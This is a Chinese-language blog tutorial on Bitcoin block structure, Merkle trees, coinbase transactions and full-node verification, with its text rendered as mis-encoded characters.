<h1 id="æ¯”ç‰¹å¸æŠ€æœ¯9-æ¯”ç‰¹å¸æœºåˆ¶-3"><a href="#æ¯”ç‰¹å¸æŠ€æœ¯9-æ¯”ç‰¹å¸æœºåˆ¶-3" class="headerlink" title="æ¯”ç‰¹å¸æŠ€æœ¯9:æ¯”ç‰¹å¸æœºåˆ¶(3)"></a>æ¯”ç‰¹å¸æŠ€æœ¯9:æ¯”ç‰¹å¸æœºåˆ¶(3)</h1><p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬é‡ç‚¹ä»‹ç»äº†å•ä¸ªäº¤æ˜“çš„æ„å»ºå’Œèµå‡ºçš„è¿‡ç¨‹ã€‚åœ¨åŒºå—é“¾ä¸­ï¼Œå¤šä¸ªäº¤æ˜“æ˜¯è¢«æ‰“åŒ…åˆ°ä¸€ä¸ªåŒºå—ä¸­ã€‚ä½¿ç”¨åŒ…å«å¤šä¸ªäº¤æ˜“åŒºå—è€Œä¸æ˜¯å•ä¸ªäº¤æ˜“ä½œä¸ºå…±è¯†çš„å•ä½ï¼Œä¸»è¦çš„ç›®çš„æ˜¯ä¼˜åŒ–ï¼Œå› ä¸ºå¦‚æœçŸ¿å·¥æ˜¯é’ˆå¯¹æ¯ä¸ªäº¤æ˜“è€Œä¸æ˜¯å¤šä¸ªäº¤æ˜“ä¸€èµ·è¿›è¡Œå…±è¯†ï¼Œé‚£ä¹ˆæ•ˆç‡å°±å¤ªä½äº†ã€‚è¿™ä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦å¯¹åŒºå—è¿›è¡Œä¸€äº›ä»‹ç»ã€‚</p>
<h2 id="Merkleæ ‘"><a href="#Merkleæ ‘" class="headerlink" title="Merkleæ ‘"></a>Merkleæ ‘</h2><h3 id="æ¯”ç‰¹å¸ä¸­çš„Merkleæ ‘"><a href="#æ¯”ç‰¹å¸ä¸­çš„Merkleæ ‘" class="headerlink" title="æ¯”ç‰¹å¸ä¸­çš„Merkleæ ‘"></a>æ¯”ç‰¹å¸ä¸­çš„Merkleæ ‘</h3><p>ä¹‹å‰æŸ¥çœ‹äº¤æ˜“ä¿¡æ¯çš„æ—¶å€™ï¼Œå¯ä»¥çœ‹åˆ°æ¯ä¸ªäº¤æ˜“éƒ½æ˜¯è‡ªå·±ç›¸å…³çš„åŒºå—ä¿¡æ¯ï¼Œ</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233031.jpg" alt="img"></p>
<p>å¯ä»¥çœ‹åˆ°äº¤æ˜“åŒ…å«åœ¨333676åŒºå—ä¸­ï¼Œ333676ä¹Ÿç§°ä¸ºåŒºå—çš„é«˜åº¦ï¼›ç‚¹å¼€çœ‹çœ‹ï¼Œ<a href="https://link.zhihu.com/?target=https://www.blockchain.com/btc/block-index/511488">Bitcoin Block #333676</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233032.jpg" alt="img"></p>
<p>åˆ°ç°åœ¨ä¸ºæ­¢ï¼Œå¤§å®¶åº”è¯¥å¯¹å…¶ä¸­çš„å¤§éƒ¨åˆ†ä¿¡æ¯éƒ½æ¯”è¾ƒç†Ÿæ‚‰äº†ï¼Œè­¬å¦‚å³ä¾§çš„å“ˆå¸Œé¡¹ä¸­ï¼Œé™¤äº†Merkle Rootè¿™ä¸€é¡¹çœ‹èµ·æ¥æ¯”è¾ƒé™Œç”Ÿä¹‹å¤–ï¼Œå…¶ä»–çš„ä¿¡æ¯åº”è¯¥éƒ½èƒ½å¤Ÿç†è§£ã€‚</p>
<p>åŒºå—æ˜¯ä¸€ç§è¢«åŒ…å«åœ¨å…¬å¼€è´¦ç°¿ï¼ˆåŒºå—é“¾ï¼‰é‡Œçš„èšåˆäº†äº¤æ˜“ä¿¡æ¯çš„å®¹å™¨æ•°æ®ç»“æ„ã€‚å®ƒç”±ä¸€ä¸ªåŒ…å«å…ƒæ•°æ®çš„åŒºå—å¤´å’Œç´§è·Ÿå…¶åçš„æ„æˆåŒºå—ä¸»ä½“çš„ä¸€é•¿ä¸²äº¤æ˜“åˆ—è¡¨ç»„æˆã€‚åŒºå—å¤´æ˜¯80å­—èŠ‚ï¼Œè€Œå¹³å‡æ¯ä¸ªäº¤æ˜“è‡³å°‘æ˜¯250å­—èŠ‚ï¼Œè€Œä¸”å¹³å‡æ¯ä¸ªåŒºå—è‡³å°‘åŒ…å«è¶…è¿‡500ä¸ªäº¤æ˜“ã€‚å…·ä½“çœ‹ä¸€ä¸‹ï¼ŒåŒºå—çš„ç»“æ„ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233033.jpg" alt="img"></p>
<p>åŒºå—é“¾ä¸­çš„åŒºå—ä¸»è¦ä¾èµ–äºä¸¤ç§åŸºäºHashçš„æ•°æ®ç»“æ„ï¼Œä¸€æ˜¯åŒºå—çš„å“ˆå¸Œé“¾ï¼Œé€šè¿‡å“ˆå¸ŒæŒ‡é’ˆï¼ˆhash pointerï¼‰å½¢æˆçš„é“¾ï¼Œåœ¨ä¸Šé¢çš„é“¾æ¥ä¸­ï¼Œé€šè¿‡ç‚¹å‡»å“ˆå¸Œå€¼ï¼Œé¡µé¢å¯ä»¥è·³è½¬åˆ°ä¹‹å‰æˆ–è€…ä¹‹åçš„åŒºå—ï¼›äºŒæ˜¯åŒºå—å†…çš„æ¯ä¸ªå—å†…çš„äº¤æ˜“ç»„æˆçš„æ ‘çŠ¶ç»“æ„ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p>
<p>ã€å“ˆå¸ŒæŒ‡é’ˆæ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼Œæ˜¯ä¸€ä¸ªæŒ‡å‘æ•°æ®å­˜å‚¨ä½ç½®åŠå…¶ä½ç½®æ•°æ®çš„å“ˆå¸Œå€¼çš„æŒ‡é’ˆã€‚è¿™å°±ä½¿å¾—æ­£å¸¸çš„æŒ‡é’ˆå¯ç”¨äºå–å›ä¿¡æ¯ï¼Œå“ˆå¸ŒæŒ‡é’ˆç”¨äºéªŒè¯ä¿¡æ¯æ˜¯å¦å‘ç”Ÿæ”¹å˜ã€‚ã€‘</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233034.jpg" alt="img"></p>
<p>ä¸Šå›¾ä¸­ï¼Œå›¾çš„ä¸ŠåŠéƒ¨åˆ†æ˜¯åŒºå—å¤´ï¼›ä¸‹åŠéƒ¨åˆ†åˆ™æ˜¯å¯¹åŒºå—å¤´éƒ¨ä¸­çš„Merkleæ ¹çš„è®¡ç®—è¿‡ç¨‹çš„å±•å¼€ã€‚æ¯ä¸ªåŒºå—ä¸­çš„äº¤æ˜“å½¢æˆäº†ä¸€æ£µMerkleæ ‘ï¼ŒMerkleæ ‘çš„æ ¹åŒ…æ‹¬åœ¨åŒºå—å¤´ä¸­ã€‚åŒºå—é€šè¿‡ä¿å­˜å‰ä¸€ä¸ªå—çš„å“ˆå¸Œå€¼å½¢æˆäº†ä¸€æ¡é“¾ã€‚åŒºå—åŒ…æ‹¬å¤´éƒ¨å’Œå…·ä½“çš„äº¤æ˜“ï¼Œå…·ä½“æ¥è¯´ï¼ŒåŒºå—å¤´éƒ¨åŒ…æ‹¬å¦‚ä¸‹ä¿¡æ¯ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233035.jpg" alt="img"></p>
<p>ç”±äºåŒºå—å¤´é‡Œé¢åŒ…å«â€œçˆ¶åŒºå—å“ˆå¸Œå€¼â€å­—æ®µï¼Œæ‰€ä»¥å½“å‰åŒºå—çš„å“ˆå¸Œå€¼ä¹Ÿå—åˆ°è¯¥å­—æ®µçš„å½±å“ã€‚å¦‚æœçˆ¶åŒºå—çš„èº«ä»½æ ‡è¯†å‘ç”Ÿå˜åŒ–ï¼Œå­åŒºå—çš„èº«ä»½æ ‡è¯†ä¹Ÿä¼šè·Ÿç€å˜åŒ–ã€‚å½“çˆ¶åŒºå—æœ‰ä»»ä½•æ”¹åŠ¨æ—¶ï¼Œçˆ¶åŒºå—çš„å“ˆå¸Œå€¼ä¹Ÿå‘ç”Ÿå˜åŒ–ã€‚è¿™å°†è¿«ä½¿å­åŒºå—çš„â€œçˆ¶åŒºå—å“ˆå¸Œå€¼â€å­—æ®µå‘ç”Ÿæ”¹å˜ï¼Œä»è€Œåˆå°†å¯¼è‡´å­åŒºå—çš„å“ˆå¸Œå€¼å‘ç”Ÿæ”¹å˜ã€‚è€Œå­åŒºå—çš„å“ˆå¸Œå€¼å‘ç”Ÿæ”¹å˜åˆå°†è¿«ä½¿å­™åŒºå—çš„â€œçˆ¶åŒºå—å“ˆå¸Œå€¼â€å­—æ®µå‘ç”Ÿæ”¹å˜ï¼Œåˆå› æ­¤æ”¹å˜äº†å­™åŒºå—å“ˆå¸Œå€¼ï¼Œä»¥æ­¤ç±»æ¨ã€‚ä¸€æ—¦ä¸€ä¸ªåŒºå—æœ‰å¾ˆå¤šä»£ä»¥åï¼Œè¿™ç§ç€‘å¸ƒæ•ˆåº”å°†ä¿è¯è¯¥åŒºå—ä¸ä¼šè¢«æ”¹å˜ï¼Œé™¤éå¼ºåˆ¶é‡æ–°è®¡ç®—è¯¥åŒºå—æ‰€æœ‰åç»­çš„åŒºå—ã€‚æ­£æ˜¯è¿™æ ·çš„é‡æ–°è®¡ç®—éœ€è¦è€—è´¹å·¨å¤§çš„è®¡ç®—é‡ï¼Œæ‰€ä»¥ä¸€ä¸ªé•¿åŒºå—é“¾çš„å­˜åœ¨å¯ä»¥è®©åŒºå—é“¾çš„å†å²ä¸å¯æ”¹å˜ï¼Œè¿™ä¹Ÿæ˜¯æ¯”ç‰¹å¸å®‰å…¨æ€§çš„ä¸€ä¸ªå…³é”®ç‰¹å¾ã€‚</p>
<p>åŒºå—ä¸»æ ‡è¯†ç¬¦æ˜¯å®ƒçš„åŠ å¯†å“ˆå¸Œå€¼ï¼Œä¸€ä¸ªé€šè¿‡SHA256ç®—æ³•å¯¹åŒºå—å¤´è¿›è¡ŒäºŒæ¬¡å“ˆå¸Œè®¡ç®—è€Œå¾—åˆ°çš„æ•°å­—æŒ‡çº¹ã€‚äº§ç”Ÿçš„32å­—èŠ‚å“ˆå¸Œå€¼è¢«ç§°ä¸ºåŒºå—å“ˆå¸Œå€¼ï¼Œä½†æ˜¯æ›´å‡†ç¡®çš„åç§°æ˜¯ï¼šåŒºå—å¤´å“ˆå¸Œå€¼ï¼Œå› ä¸ºåªæœ‰åŒºå—å¤´è¢«ç”¨äºè®¡ç®—ã€‚ä¾‹ å¦‚: 000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26fæ˜¯ç¬¬ä¸€ä¸ªæ¯”ç‰¹å¸åŒºå—çš„åŒºå—å“ˆå¸Œå€¼ã€‚åŒºå—å“ˆå¸Œå€¼å¯ä»¥å”¯ä¸€ã€æ˜ç¡®åœ°æ ‡è¯†ä¸€ä¸ªåŒºå—ï¼Œå¹¶ä¸”ä»»ä½•èŠ‚ç‚¹é€šè¿‡ç®€å•åœ°å¯¹åŒºå—å¤´è¿›è¡Œå“ˆå¸Œè®¡ç®—éƒ½å¯ä»¥ç‹¬ç«‹åœ°è·å–è¯¥åŒºå—å“ˆå¸Œå€¼ã€‚</p>
<hr>
<p>æ¯ä¸ªåŒºå—éƒ½åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªäº¤æ˜“ã€‚æ¯ä¸ªåŒºå—çš„ç¬¬ä¸€ä¸ªäº¤æ˜“æ˜¯coinbase transactionï¼Œä¹Ÿå³generation transactionï¼Œä½œä¸ºçŸ¿å·¥æ‰“åŒ…äº¤æ˜“ç”ŸæˆåŒºå—çš„å¥–åŠ±ï¼Œå½“å‰çš„æŒ–çŸ¿å¥–åŠ±æ˜¯12.5ä¸ªæ¯”ç‰¹å¸ã€‚coinbaseäº¤æ˜“çš„UTXOæœ‰ä¸€ä¸ªç‰¹æ®Šçš„è§„å®šï¼Œè‡³å°‘åœ¨100ä¸ªåŒºå—ä¹‹åæ‰èƒ½ä½œä¸ºè¾“å…¥è¿›è¡ŒèŠ±è´¹ã€‚ä¸»è¦æ˜¯é˜²æ­¢çŸ¿å·¥åœ¨åŒºå—è¿˜æ²¡æœ‰è¢«æ­£å¼ç¡®è®¤çš„æƒ…å†µä¸‹å°±æŠŠå¸ç»™èŠ±äº†ã€‚è™½ç„¶åŒºå—å¹¶ä¸è¦æ±‚é™¤äº†coinbaseä¹‹å¤–çš„äº¤æ˜“ï¼Œä½†æ˜¯çŸ¿å·¥ä»¬ä¸€èˆ¬éƒ½ä¼šå°½é‡å¤šæ‰“åŒ…ä¸€äº›äº¤æ˜“ï¼Œä»¥è·å¾—å°½å¯èƒ½å¤šçš„äº¤æ˜“è´¹ç”¨ã€‚</p>
<p>åŒºå—ä¸­çš„æ‰€æœ‰äº¤æ˜“éƒ½ä½¿ç”¨äºŒè¿›åˆ¶<a href="https://link.zhihu.com/?target=https://bitcoin.org/en/glossary/serialized-transaction">raw transaction</a>çš„æ ¼å¼ä¿å­˜åœ¨åŒºå—ä¸­ï¼Œç„¶åå¯¹raw transactionè¿›è¡Œå“ˆå¸Œå¾—åˆ°äº¤æ˜“idï¼ˆtxidï¼‰ã€‚merkleæ ‘å°±æ˜¯ä½¿ç”¨è¿™æ ·çš„txidè¿›è¡Œæ„é€ çš„ã€‚</p>
<h3 id="Merkleæ ‘æ¦‚å¿µ"><a href="#Merkleæ ‘æ¦‚å¿µ" class="headerlink" title="Merkleæ ‘æ¦‚å¿µ"></a>Merkleæ ‘æ¦‚å¿µ</h3><p>Merkle treeæ˜¯ä¸€ç§å“ˆå¸ŒäºŒå‰æ ‘ï¼Œä»¥Ralph Merkleå‘½åï¼ŒRalphåœ¨1979å¹´å¯¹è¯¥æ•°æ®ç»“æ„ç”³è¯·äº†ä¸“åˆ©ï¼ˆäº2002å¹´è¿‡æœŸï¼‰ã€‚å®ƒæ˜¯ä¸€ç§ç”¨åšå¿«é€Ÿå½’çº³å’Œæ ¡éªŒå¤§è§„æ¨¡æ•°æ®å®Œæ•´æ€§çš„æ ‘å½¢æ•°æ®ç»“æ„ã€‚</p>
<p>ç‰¹ç‚¹:</p>
<ul>
<li>å®ƒæ˜¯ä¸€ç§æ ‘ï¼Œå¤§å¤šæ•°æ˜¯<a href="https://zh.wikipedia.org/zh/%E4%BA%8C%E5%8F%89%E6%A0%91">äºŒå‰æ ‘</a>ï¼Œä¹Ÿå¯ä»¥æ˜¯å¤šå‰æ ‘ï¼Œå…·æœ‰æ ‘ç»“æ„çš„æ‰€æœ‰ç‰¹ç‚¹ã€‚</li>
<li>Merkle Treeçš„å¶å­èŠ‚ç‚¹æ˜¯æ•°æ®å—çš„å“ˆå¸Œã€‚</li>
<li>Merkle Treeçš„éå¶å­èŠ‚ç‚¹çš„å“ˆå¸Œå€¼æ˜¯æ ¹æ®å®ƒä¸‹é¢æ‰€æœ‰å¶å­èŠ‚ç‚¹çš„å€¼å“ˆå¸Œè®¡ç®—å¾—åˆ°ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233036.jpg" alt="img"></p>
<p>åœ¨ä¸Šå›¾ä¸­ï¼Œ T<sub>A</sub><del>T<sub>H</sub>æ˜¯åŒºå—ä¸­åŒ…æ‹¬çš„æ­£å¸¸çš„äº¤æ˜“ã€‚ä»åº•å±‚å‘ä¸Šæ„å»ºMerkleæ ‘ï¼Œå¯¹æ¯ä¸ªäº¤æ˜“éƒ½è¿›è¡Œå“ˆå¸Œï¼Œåˆ†åˆ«å¾—åˆ° H<sub>A</sub></del>H<sub>H</sub>!ç”Ÿæˆçš„å•ä¸ªå“ˆå¸Œä¸é‚»è¿‘çš„å“ˆå¸Œå€¼ç»„åˆï¼Œå†æ¬¡è¿›è¡Œå“ˆå¸Œã€‚è­¬å¦‚  H<sub>A</sub>å’Œ H<sub>B</sub>ç»„åˆï¼Œå†æ¬¡è¿›è¡Œå“ˆå¸Œï¼Œå¾—åˆ° H<sub>AB</sub>. è¿™ä¸ªè¿‡ç¨‹ä¸€ç›´æŒç»­ä¸‹å»ï¼Œä»åº•å±‚ä¸€ç›´åˆ°æ ‘æ ¹ã€‚</p>
<p>å¦‚æœèŠ‚ç‚¹æ€»æ•°æ˜¯å¥‡æ•°ä¸ªï¼Œåˆ™å¤åˆ¶ä¸€ä»½æœ€åä¸€ä¸ªèŠ‚ç‚¹ã€‚è­¬å¦‚å¯¹äº5ä¸ªå¶å­èŠ‚ç‚¹çš„æƒ…å†µï¼Œæœ€ç»ˆç”Ÿæˆçš„æ ‘å¯èƒ½æ˜¯è¿™æ ·çš„ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233037.jpg" alt="img"></p>
<p>å¦‚æœå¶å­æ°å¥½æ˜¯2çš„æ¬¡æ–¹ï¼Œåˆ™åœ¨æ ‘æ ¹å¤„çš„æƒ…å†µå¦‚ä¸‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233038.jpg" alt="img"></p>
<p>åœ¨ä¸Šå›¾ä¸­ï¼Œ<strong>merkle rootï¼Œ</strong>æ ‡è®°ä¸º H<sub>ABCDEFGHIJKLMNOP</sub>,æ˜¯ä¸€ä¸ª32å­—èŠ‚çš„æ•°æ®ï¼Œå¹¶ä¸”ä¼šè¢«æ”¾ç½®åœ¨åŒºå—å¤´ä¸­ï¼Œä»£è¡¨äº†æ•´ä¸ªåŒºå—çš„äº¤æ˜“æ•°æ®ã€‚</p>
<p>ç”±äºå“ˆå¸Œçš„å•å‘æ€§ï¼Œå¯ä»¥å¾—å‡ºç»“è®ºï¼Œå¦‚æœä¸¤æ£µMerkleæ ‘çš„merkle rootç›¸åŒï¼Œé‚£ä¹ˆè¿™ä¸¤æ£µæ ‘çš„ç»“æ„å’Œæ¯ä¸ªèŠ‚ç‚¹ä¹Ÿå¿…ç„¶æ˜¯ç›¸åŒçš„ã€‚å¦å¤–ï¼Œåªè¦å­˜å‚¨çš„å¶å­èŠ‚ç‚¹æ•°æ®æœ‰ä»»ä½•çš„å˜åŠ¨ï¼Œå°±ä¼šé€çº§å‘ä¸Šä¼ é€’åˆ°ç›¸åº”çš„çˆ¶èŠ‚ç‚¹ï¼Œæœ€ç»ˆä½¿å¾—Merkleæ ‘çš„æ ¹èŠ‚ç‚¹å“ˆå¸Œå€¼å‘ç”Ÿå˜åŒ–ã€‚</p>
<p>é™¤äº†åŒºå—é“¾ä¹‹å¤–ï¼ŒMerkleå¯ä¿¡æ ‘åœ¨å…¶ä»–é¢†åŸŸåº”ç”¨ä¹Ÿå¾ˆå¤šï¼Œå¦‚åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ç”¨äºæ•°æ®ä¸€è‡´æ€§éªŒè¯ï¼Œgitä¸­çš„ç‰ˆæœ¬ä¸€è‡´æ€§éªŒè¯ä¹Ÿæ˜¯åŸºäºMerkleæ ‘ã€‚å¤§éƒ¨åˆ†Merkleæ ‘æ˜¯äºŒå‰å“ˆå¸Œæ ‘ï¼Œåœ¨æ¯”ç‰¹å¸ä¸­ï¼Œmerkleæ ‘ä¸»è¦é€‚ç”¨äºç»„ç»‡æ­£å¸¸çš„äº¤æ˜“ï¼Œä½¿å¾—äº¤æ˜“æ˜“äºéªŒè¯å¹¶ä¸”ä½¿ç”¨è¾ƒå°‘çš„èµ„æºã€‚</p>
<p>ä¸ºä»€ä¹ˆè¦ä½¿ç”¨è¿™æ ·çš„æ•°æ®ç»“æ„å‘¢ï¼Ÿæ ‘è¿™ç§æ•°æ®ç»“æ„æˆ‘ä»¬åº”è¯¥æ˜¯æ¯”è¾ƒç†Ÿæ‚‰çš„ï¼Œç‰¹åˆ«æ˜¯è¿™ç§æ»¡äºŒå‰æ ‘ã€‚é‚£æˆ‘ä»¬æ¥ç®—ä¸€ä¸‹ï¼Œå¦‚æœå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæœ‰16ä¸ªå¶å­èŠ‚ç‚¹ï¼Œä¹Ÿå³ä¸€ä¸ªåŒºå—ä¸­æœ‰16ä¸ªäº¤æ˜“ï¼Œé‚£ä¹ˆæ€»å…±éœ€è¦å¤šå°‘æ¬¡å“ˆå¸Œè®¡ç®—ï¼Ÿå¦‚æœæ˜¯ä¸ºäº†ä¿è¯åŒºå—ä¸­çš„äº¤æ˜“æ²¡æœ‰è¢«ç¯¡æ”¹ï¼Œé‚£ä¹ˆå®é™…ä¸Šåªéœ€è¦æŠŠ16ä¸ªäº¤æ˜“è¿æ¥èµ·æ¥ï¼Œç„¶åå¯¹æ•´ä¸ªå†…å®¹åšä¸€æ¬¡å“ˆå¸Œå°±å¤Ÿäº†ï¼Œä¸ºä»€ä¹ˆè¦è¿™ä¹ˆéº»çƒ¦å½¢æˆä¸€æ£µæ ‘ï¼Œè€Œä¸”åšè¿™ä¹ˆå¤šæ¬¡çš„è®¡ç®—å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬æ¥ä½¿ç”¨åˆ†å¸ƒå¼æ–‡ä»¶æœåŠ¡å™¨åšä¾‹å­ã€‚å¦‚æœä¸¤ä¸ªæœåŠ¡å™¨Aå’ŒBéƒ½æ˜¯å¯¹æŸä¸ªæ–‡ä»¶ç³»ç»Ÿçš„å†—ä½™å¤‡ä»½ã€‚ç°åœ¨å¸Œæœ›Aå’ŒBé€šä¿¡æ¥ç¡®è®¤ä¸€ä¸‹ï¼Œå®ƒä»¬æ‰€ä¿å­˜çš„æ–‡ä»¶æ˜¯ä¸€è‡´çš„ã€‚å¦‚æœä¸ä½¿ç”¨å“ˆå¸Œï¼Œé‚£ä¹ˆè¿™ä¸ªé€šä¿¡ä»£ä»·æ˜¯æ•´ä¸ªçš„æ–‡ä»¶ç³»ç»Ÿï¼Œéœ€è¦æŠŠæ‰€æœ‰çš„æ–‡ä»¶éƒ½ä¼ é€’åˆ°ä¸€ä¸ªè¿›è¡Œæ¯”è¾ƒçš„æœåŠ¡å™¨ä¸Šï¼Œç„¶åè¿›è¡Œå­—ç¬¦ä¸²æ¯”è¾ƒã€‚è¿™æ— ç–‘æ˜¯éå¸¸ä½æ•ˆçš„ã€‚æ¯”è¾ƒå“ˆå¸Œå½“ç„¶æ˜¯ä¸€ä¸ªå¥½æ–¹æ³•ã€‚å› ä¸ºå“ˆå¸Œçš„å•å‘æ€§å’Œå›ºå®šçš„è¾“å‡ºé•¿åº¦ï¼Œæ‰€ä»¥é€šä¿¡ä»£ä»·å°±å¤§å¤§é™ä½äº†ã€‚é‚£ä¹ˆä¸ºä»€ä¹ˆè¦ç”¨ä¸€æ£µæ ‘å‘¢ï¼Ÿ</p>
<p>å¦‚æœAå’ŒBä¸¤ä¸ªæœåŠ¡å™¨ä¸Šå­˜å‚¨çš„æ–‡ä»¶ç³»ç»Ÿéƒ½æ˜¯ä¸€è‡´çš„ï¼Œä¹Ÿå³ä¸¤ä¸ªçš„å“ˆå¸Œå€¼æ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆè‡ªç„¶æ˜¯å¾ˆå¥½çš„ã€‚å¦‚æœä¸¤ä¸ªä¸ä¸€è‡´å‘¢ï¼Ÿè­¬å¦‚è¯´AæœåŠ¡å™¨ä¸Šæœ‰ä¸€ä¸ªæ–‡ä»¶æ›´æ–°äº†ï¼Œè€ŒBæœåŠ¡å™¨è¿˜æ²¡æœ‰æ¥å¾—åŠæ›´æ–°ã€‚æ€ä¹ˆæ ·èƒ½å¤Ÿå¿«é€Ÿåœ°å®šä½åˆ°å¯¼è‡´ä¸¤ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸ä¸€è‡´çš„æ–‡ä»¶ï¼Ÿ</p>
<p>è¿™æ—¶å°±èƒ½ä½“ç°æ ‘ç»“æ„çš„å¥½å¤„äº†ã€‚å¦‚æœä¸¤ä¸ªå“ˆå¸Œå€¼ä¸ä¸€è‡´ï¼ŒAæœåŠ¡å™¨å°±å¯ä»¥å‘BæœåŠ¡å™¨è¦ä¸¤ä¸ªå­èŠ‚ç‚¹çš„å“ˆå¸Œå€¼ï¼›ç„¶åæ²¿ç€ä¸ä¸€æ ·çš„è·¯å¾„ä¸€ç›´èµ°ä¸‹å»ï¼Œä»è€Œå¯ä»¥ç¡®å®šå¯¼è‡´æ ¹å“ˆå¸Œå€¼ä¸åŒçš„æ–‡ä»¶ã€‚è€Œä¸”ç¡®å®šè¿™ä¸ªä¸ä¸€è‡´æ–‡ä»¶çš„å¤æ‚åº¦æ˜¯ï¼Ÿ</p>
<p>ä»¥ä¸Šæ˜¯åˆ†å¸ƒå¼æ–‡ä»¶æœåŠ¡å™¨çš„ä¾‹å­ã€‚é‚£ä¹ˆåœ¨æ¯”ç‰¹å¸ä¸­ï¼ŒMerkleæ ‘çš„ä½œç”¨æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€æ—¦æ¥å—åˆ°ä¸€ä¸ªæ–°äº¤æ˜“ï¼ŒèŠ‚ç‚¹éœ€è¦éªŒè¯å®ƒï¼Œç‰¹åˆ«æ˜¯ï¼ŒéªŒè¯äº¤æ˜“çš„è¾“å…¥ä¸­çš„æ¯ä¸€ä¸ªä¹‹å‰æ˜¯å¦è¢«èŠ±è´¹ã€‚ä¸ºäº†å®Œæˆè¿™ä¸ªéªŒè¯ï¼Œéœ€è¦è®¿é—®åŒºå—é“¾ã€‚å¦‚æœèŠ‚ç‚¹ä¸ä¿¡ä»»ç½‘ç»œä¸Šçš„å…¶ä»–èŠ‚ç‚¹ï¼Œé‚£ä¹ˆ è¿™ä¸ªèŠ‚ç‚¹éœ€è¦ä¿å­˜ç½‘ç»œä¸Šçš„æ‰€æœ‰åŒºå—ï¼Œä»¥ä¾¿éªŒè¯äº¤æ˜“ã€‚è¿™ç§èŠ‚ç‚¹ç§°ä½œå…¨èŠ‚ç‚¹ã€‚åœ¨æ¯”ç‰¹å¸å‘å±•çš„æ—©æœŸï¼Œæ‰€æœ‰èŠ‚ç‚¹éƒ½æ˜¯å…¨èŠ‚ç‚¹ï¼›å½“å‰çš„æ¯”ç‰¹å¸æ ¸å¿ƒå®¢æˆ·ç«¯ä¹Ÿæ˜¯å®Œæ•´åŒºå—é“¾èŠ‚ç‚¹ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233039.jpg" alt="img"></p>
<p>åœ¨å½“å‰çš„æ¯”ç‰¹å¸ç½‘ç»œä¸­ï¼Œå®é™…å‚ä¸å…±è¯†çš„å…¨éªŒè¯èŠ‚ç‚¹ï¼ˆfully validating nodesï¼‰å¹¶ä¸å¤šï¼Œå› ä¸ºå…¨éªŒè¯èŠ‚ç‚¹ä¼šç»´æŠ¤æ•´ä¸ªåŒºå—é“¾çš„æ•°æ®ï¼Œç”±äºåŒºå—é“¾çš„ä¸å¯ç¯¡æ”¹å’Œappend-onlyï¼Œéšç€æ—¶é—´çš„å¢åŠ ï¼Œæ•´ä¸ªåŒºå—é“¾çš„æ•°æ®é‡éå¸¸å¤§ã€‚åœ¨2014å¹´4æœˆä»½ï¼Œæ¯”ç‰¹å¸ç½‘ç»œä¸­å­˜å‚¨æ‰€æœ‰åŒºå—çš„æ•°æ®ï¼Œéœ€è¦15GBçš„ç©ºé—´ï¼Œç°åœ¨è¦å®Œæ•´ä¸‹è½½æ¯”ç‰¹å¸çš„æ‰€æœ‰åŒºå—æ•°æ®ï¼Œéœ€è¦200GBä»¥ä¸Šçš„ç©ºé—´ã€‚</p>
<p>å…¨èŠ‚ç‚¹è¦æ£€æŸ¥ç¬¬300,000å·åŒºå—ä¸­çš„æŸä¸ªäº¤æ˜“ï¼Œå®ƒä¼šæŠŠä»è¯¥åŒºå—å¼€å§‹ä¸€ç›´å›æº¯åˆ°åˆ›ä¸–åŒºå—çš„300,000ä¸ªåŒºå—å…¨éƒ¨éƒ½é“¾æ¥èµ·æ¥ï¼Œå»ºç«‹ä¸€ä¸ªå®Œæ•´çš„UTXOæ•°æ®åº“ï¼Œé€šè¿‡ç¡®è®¤è¯¥UTXOæ˜¯å¦è¿˜æœªè¢«æ”¯ä»˜æ¥è¯å®äº¤æ˜“çš„æœ‰æ•ˆæ€§ã€‚å…¨éªŒè¯èŠ‚ç‚¹ç»´æŠ¤æ‰€æœ‰çš„UTXOï¼Œ æœ€å¥½æ˜¯å­˜åœ¨RAMä¸­ï¼Œè¿™æ ·ï¼Œå½“ç½‘ç»œä¸­æœ‰æ–°çš„äº¤æ˜“å¹¿æ’­æ—¶ï¼Œå…¨éªŒè¯èŠ‚ç‚¹å¯ä»¥å¿«é€Ÿåœ°è¿›è¡ŒæŸ¥è¯¢ã€è¿è¡Œè„šæœ¬ã€ç¡®å®šäº¤æ˜“æ˜¯å¦æ­£ç¡®ã€ç­¾åæ˜¯å¦æœ‰æ•ˆï¼Œå¦‚æœå…¨éƒ¨æ­£ç¡®ï¼Œåˆ™å°†äº¤æ˜“æ·»åŠ åˆ°äº¤æ˜“æ± ä¸­ã€‚</p>
